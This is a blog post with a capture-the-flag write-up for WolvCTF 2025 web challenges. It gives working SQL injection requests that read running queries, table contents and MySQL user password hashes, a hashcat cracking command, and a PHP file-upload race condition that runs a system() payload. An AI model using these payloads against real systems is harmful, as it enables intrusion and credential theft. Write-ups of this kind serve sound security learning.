<!DOCTYPE html>
<html><head lang="en">
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Wolvctf 2025 writeup - kargeo</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="I picked a random CTF on CTFtime to stretch my brain over the weekend." />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="Wolvctf 2025 writeup" />
<meta property="og:description" content="I picked a random CTF on CTFtime to stretch my brain over the weekend." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://kar9eo.github.io/posts/wolvctf2025/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2025-03-23T20:32:16+03:00" />
<meta property="article:modified_time" content="2025-03-23T20:32:16+03:00" />

<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Wolvctf 2025 writeup"/>
<meta name="twitter:description" content="I picked a random CTF on CTFtime to stretch my brain over the weekend."/>

        <link href="https://kar9eo.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="https://kar9eo.github.io/css/main.6a0f23ea50fd34b46fee262a5a68e17d458c51a2bc99ba1ba018065de6b180c3.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://kar9eo.github.io/css/dark.50b57e12d401420df23965fed157368aba37b76df0ecefd0b1ecd4da664f01a0.css"   />
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="https://kar9eo.github.io/">kargeo</a>
	</div>
	<nav>
		
		
	</nav>
</header>

<main>
  <article>
    <div class="post-container">
      
      <div class="post-content">
        <div class="title">
          <h1 class="title">Wolvctf 2025 writeup</h1>
          <div class="meta">Posted on Mar 23, 2025</div>
        </div>
        
        <section class="body">
          <p><img src="/img/wolvctf2025/7.png" alt=""></p>
<h2 id="javascript-puzzle">Javascript Puzzle</h2>
<blockquote>
<p>It is often useful to force exceptions to potentially get back valuable information.</p>
<p>Can you make a request which causes an exception in this app?</p>
</blockquote>
<p>app.js</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">username</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;Guest&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Hello &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">username</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">output</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">error</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">sendFile</span>(<span style="color:#a6e22e">__dirname</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/flag.txt&#39;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">port</span>, () =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Server is running at http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>)
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></div><p>To raise an exception, you need to pass an object in the query parameter.</p>
<pre tabindex="0"><code>GET /?username[toString]=test HTTP/2
Host: js-puzzle-974780027560.us-east5.run.app
</code></pre><p><img src="/img/wolvctf2025/6.png" alt=""></p>
<h2 id="limited-1-3">Limited {1-3}</h2>
<blockquote>
<p>Note: This service has 3 challenges</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, jsonify, render_template
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask_limiter <span style="color:#f92672">import</span> Limiter
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask_limiter.util <span style="color:#f92672">import</span> get_remote_address
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask_mysqldb <span style="color:#f92672">import</span> MySQL
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FLAG1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;wctf{redacted-flag}&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>limiter <span style="color:#f92672">=</span> Limiter(
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">=</span>app,
</span></span><span style="display:flex;"><span>    key_func<span style="color:#f92672">=</span>get_remote_address,
</span></span><span style="display:flex;"><span>    default_limits<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;5 per second&#34;</span>],
</span></span><span style="display:flex;"><span>    storage_uri<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;memory://&#34;</span>,
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_db_hostname</span>():
</span></span><span style="display:flex;"><span>    db_hostname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;db&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        socket<span style="color:#f92672">.</span>getaddrinfo(db_hostname, <span style="color:#ae81ff">3306</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> db_hostname
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;MYSQL_HOST&#39;</span>] <span style="color:#f92672">=</span> get_db_hostname()
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;MYSQL_USER&#39;</span>] <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#34;MYSQL_USER&#34;</span>]
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;MYSQL_PASSWORD&#39;</span>] <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#34;MYSQL_PASSWORD&#34;</span>]
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;MYSQL_DB&#39;</span>] <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#34;MYSQL_DB&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;app.config:&#39;</span>, app<span style="color:#f92672">.</span>config)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mysql <span style="color:#f92672">=</span> MySQL(app)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">root</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/query&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">query</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        price <span style="color:#f92672">=</span> float(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;price&#39;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;0.00&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>        price <span style="color:#f92672">=</span> <span style="color:#ae81ff">0.0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    price_op <span style="color:#f92672">=</span> str(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;price_op&#39;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;&gt;&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> re<span style="color:#f92672">.</span><span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39; ?(=|&lt;|&lt;=|&lt;&gt;|&gt;=|&gt;) ?&#39;</span>, price_op):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;price_op must be one of =, &lt;, &lt;=, &lt;&gt;, &gt;=, or &gt; (with an optional space on either side)&#39;</span>, <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(price_op) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;price_op too long&#39;</span>, <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    limit <span style="color:#f92672">=</span> str(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;limit&#39;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    query <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;SELECT /*</span><span style="color:#e6db74">{</span>FLAG1<span style="color:#e6db74">}</span><span style="color:#e6db74">*/category, name, price, description FROM Menu WHERE price </span><span style="color:#e6db74">{</span>price_op<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>price<span style="color:#e6db74">}</span><span style="color:#e6db74"> ORDER BY 1 LIMIT </span><span style="color:#e6db74">{</span>limit<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;query:&#39;</span>, query)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;;&#39;</span> <span style="color:#f92672">in</span> query:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Sorry, multiple statements are not allowed&#39;</span>, <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        cur <span style="color:#f92672">=</span> mysql<span style="color:#f92672">.</span>connection<span style="color:#f92672">.</span>cursor()
</span></span><span style="display:flex;"><span>        cur<span style="color:#f92672">.</span>execute(query)
</span></span><span style="display:flex;"><span>        records <span style="color:#f92672">=</span> cur<span style="color:#f92672">.</span>fetchall()
</span></span><span style="display:flex;"><span>        column_names <span style="color:#f92672">=</span> [desc[<span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> desc <span style="color:#f92672">in</span> cur<span style="color:#f92672">.</span>description]
</span></span><span style="display:flex;"><span>        cur<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> str(e), <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> [dict(zip(column_names, row)) <span style="color:#66d9ef">for</span> row <span style="color:#f92672">in</span> records]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify(result)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&lt;path:path&gt;&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">missing_handler</span>(path):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;page not found!&#39;</span>, <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, port<span style="color:#f92672">=</span>PORT, threaded<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span></code></pre></div><h2 id="limited-1">Limited 1</h2>
<blockquote>
<p>Can you attack the menu system to read the flag that is in a comment inside the query itself?</p>
<p>Note: This is the first in a series of 3 challenges</p>
</blockquote>
<p><code>INFORMATION_SCHEMA.PROCESSLIST</code> is a special table available in MySQL and MariaDB that provides information about active processes and threads within the database server. This table can list all operations that DB is performing at the moment.</p>
<p>Links:</p>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-current-queries">MYSQL Current Queries
</a></li>
</ul>
<pre tabindex="0"><code>GET /query?price=5.00&amp;price_op=%3C0/*&amp;limit=5*/union+all+select+1,2,3,INFO+from+INFORMATION_SCHEMA.PROCESSLIST HTTP/1.1
Host: limited-app-974780027560.us-east5.run.app
</code></pre><p><img src="/img/wolvctf2025/3.png" alt=""></p>
<h2 id="limited-2">Limited 2</h2>
<blockquote>
<p>Note: This uses the same source as Limited 1.</p>
<p>Can you read the flag in another table?</p>
<p>That table name starts with Flag_</p>
</blockquote>
<ol>
<li>Get information about tables</li>
</ol>
<pre tabindex="0"><code>GET /query?price=5.00&amp;price_op=&gt;0/*&amp;limit=5*/+UNION+SELECT+NULL,table_name,NULL,NULL+FROM+information_schema.tables HTTP/2
Host: limited-app-974780027560.us-east5.run.app
</code></pre><p><img src="/img/wolvctf2025/1.png" alt=""></p>
<ol start="2">
<li>Get the flag</li>
</ol>
<pre tabindex="0"><code>GET /query?price=5.00&amp;price_op=&gt;0/*&amp;limit=5*/+UNION+SELECT+NULL,value,NULL,NULL+FROM+Flag_REDACTED HTTP/2
Host: limited-app-974780027560.us-east5.run.app
</code></pre><p><img src="/img/wolvctf2025/2.png" alt=""></p>
<h2 id="limited-3">Limited 3</h2>
<blockquote>
<p>Note: This uses the same source as Limited 1.</p>
<p>There is a db user named: flag</p>
<p>The password for this user is 13 characters and can be found in rockyou.</p>
<p>Please wrap this password with wctf{} before submitting.</p>
<p>For example, if the password was hocuspocus123 then the flag would be wctf{hocuspocus123}</p>
</blockquote>
<p>Links:</p>
<ul>
<li><a href="https://www.percona.com/blog/brute-force-mysql-password-from-a-hash/">Brute-Force MySQL Password From a Hash
</a></li>
</ul>
<ol>
<li>Get the password hash of the user named flag</li>
</ol>
<pre tabindex="0"><code>GET /query?price=5.00&amp;price_op=%3C0/*&amp;limit=5*/+union+all+select+plugin,User,3,CONCAT(&#39;$mysql&#39;,LEFT(authentication_string,6),&#39;*&#39;,INSERT(HEX(SUBSTR(authentication_string,8)),41,0,&#39;*&#39;))+AS+hash+from+mysql.user HTTP/2
Host: limited-app-974780027560.us-east5.run.app
</code></pre><p><img src="/img/wolvctf2025/4.png" alt=""></p>
<ol start="2">
<li>Filter the rockyou dictionary</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -x <span style="color:#e6db74">&#39;.\{13\}&#39;</span> rockyou.txt &gt; test.txt
</span></span></code></pre></div><ol start="3">
<li>Run Hashcat</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">7401</span> -a <span style="color:#ae81ff">0</span> -D <span style="color:#ae81ff">1</span> -O -w <span style="color:#ae81ff">3</span> ./hash1.txt ./test.txt
</span></span></code></pre></div><h2 id="art-contest">Art Contest</h2>
<blockquote>
<p>Submit your best ascii art to win!</p>
</blockquote>
<p>index.php</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_FILES[<span style="color:#e6db74">&#39;fileToUpload&#39;</span>])) {
</span></span><span style="display:flex;"><span>    $target_file <span style="color:#f92672">=</span> <span style="color:#a6e22e">basename</span>($_FILES[<span style="color:#e6db74">&#34;fileToUpload&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>]);
</span></span><span style="display:flex;"><span>    $session_id <span style="color:#f92672">=</span> <span style="color:#a6e22e">session_id</span>();
</span></span><span style="display:flex;"><span>    $target_dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/www/html/uploads/</span><span style="color:#e6db74">$session_id</span><span style="color:#e6db74">/&#34;</span>;
</span></span><span style="display:flex;"><span>    $target_file_path <span style="color:#f92672">=</span> $target_dir <span style="color:#f92672">.</span> $target_file;
</span></span><span style="display:flex;"><span>    $uploadOk <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    $lastDotPosition <span style="color:#f92672">=</span> <span style="color:#a6e22e">strrpos</span>($target_file, <span style="color:#e6db74">&#39;.&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span>($target_file_path)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Sorry, file already exists.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        $uploadOk <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($_FILES[<span style="color:#e6db74">&#34;fileToUpload&#34;</span>][<span style="color:#e6db74">&#34;size&#34;</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">50000</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Sorry, your file is too large.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        $uploadOk <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($lastDotPosition <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>        $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($target_file, <span style="color:#ae81ff">0</span>, $lastDotPosition);
</span></span><span style="display:flex;"><span>        $extension <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($target_file, <span style="color:#ae81ff">0</span>, $lastDotPosition);
</span></span><span style="display:flex;"><span>        $extension <span style="color:#f92672">=</span> <span style="color:#a6e22e">substr</span>($target_file, $lastDotPosition <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($extension <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $extension <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;txt&#39;</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Sorry, only .txt extensions are allowed.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        $uploadOk <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^[a-f0-9]{32}$/&#39;</span>, $session_id))) {
</span></span><span style="display:flex;"><span>    	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Sorry, that is not a valid session ID.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>        $uploadOk <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($uploadOk <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Sorry, your file was not uploaded.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#34;fileToUpload&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>], $target_file_path)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;The file &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>(<span style="color:#a6e22e">basename</span>($_FILES[<span style="color:#e6db74">&#34;fileToUpload&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>])) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; has been uploaded.&#34;</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Sorry, there was an error uploading your file.&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $old_path <span style="color:#f92672">=</span> <span style="color:#a6e22e">getcwd</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chdir</span>($target_dir);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;chmod -- 000 *&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chdir</span>($old_path);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>❗ The <code>strrpos</code> function will return <code>0</code> if the dot is at the beginning of the filename.</p>
<ol>
<li>Prepare a file (<code>.php</code>) with the payload.</li>
</ol>
<pre tabindex="0"><code>POST / HTTP/2
Host: art-contest-974780027560.us-east5.run.app
Cookie: PHPSESSID=a21bbb59a6d7db8e04005130cabd044d; GAESA=CpwBMDBmZDdkNzMzNzU2YzUyMWQwZWNmYzY4MGVkYmU3NGNjNjYxMTQwMDMxZWU1YmNkMDIzNzJkOGExYzEzMzQ4MGY4MzlmYWY4YWQ3MzczMTJhYTIyMjkxNTRhMWNiYjhjZDI2NmM3YmEzNGJlOTY4ZGIwOGY3OWEzMWZiNDUxNzc3ZTg5NzlkNzEyNzMzMDk2NDY5YWFjODI4MzkyEKveqZLcMg
Content-Length: 338
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBHpbYJMycIteIKgs


------WebKitFormBoundaryBHpbYJMycIteIKgs
Content-Disposition: form-data; name=&#34;fileToUpload&#34;; filename=&#34;.php&#34;
Content-Type: text/plain

&lt;?php 
system(&#39;cd /var/www/html;./get_flag&#39;)
?&gt;
------WebKitFormBoundaryBHpbYJMycIteIKgs
Content-Disposition: form-data; name=&#34;submit&#34;

Submit Art
------WebKitFormBoundaryBHpbYJMycIteIKgs--
</code></pre><ol start="2">
<li>Exploiting the race condition. I am requesting the downloadable file in 100 threads, some requests managed to obtain the resource before shell_exec(&lsquo;chmod &ndash; 000 *&rsquo;); was executed.</li>
</ol>
<pre tabindex="0"><code>GET /uploads/a21bbb59a6d7db8e04005130cabd044d/.php HTTP/2
Host: art-contest-974780027560.us-east5.run.app
</code></pre><p><img src="/img/wolvctf2025/5.png" alt=""></p>
<p>Thank you for your attention! Happy hacking! 🖤</p>

        </section>
        <div class="post-tags">
          
          
          
        </div>
      </div>

      
      
    </div>

    </article>
</main>
<footer>
  <div style="display:flex"></div>
  <div class="footer-info">
    2025  <a
      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
  </div>
</footer>



</div>
    </body>
</html>
